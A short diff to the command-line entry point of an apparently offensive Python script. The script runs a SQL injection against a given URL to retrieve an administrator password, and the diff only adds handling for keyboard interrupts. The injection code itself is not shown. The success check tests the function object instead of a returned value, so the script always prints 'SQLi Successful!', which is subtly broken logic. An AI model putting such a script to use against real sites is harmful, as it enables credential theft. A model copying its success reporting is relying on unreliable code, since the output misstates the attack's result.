@@ -49,10 +49,13 @@ if __name__ == "__main__":
 		print(f'\033[31m[-] Usage: {sys.argv[0]} <url>\033[0m')
 		print(f'\033[31m[-] Example: {sys.argv[0]} http://www.example.com\033[0m')
 		sys.exit(1)
-	print('\033[32m[+] Retrieving administrator password...\033[0m')
-	sqli_exploit(url)
+	try:
+		print('\033[32m[+] Retrieving administrator password...\033[0m')
+		sqli_exploit(url)
 
-	if sqli_exploit:
-		print('\033[32m[+] SQLi Successful!\033[0m')
-	else:
-		print('\033[31m[-] SQLi Unsuccessful!!!\033[0m')
+		if sqli_exploit:
+			print('\033[32m[+] SQLi Successful!\033[0m')
+		else:
+			print('\033[31m[-] SQLi Unsuccessful!!!\033[0m')
+	except KeyboardInterrupt:
+			print('\033[33m[+] Exited...\033[0m')
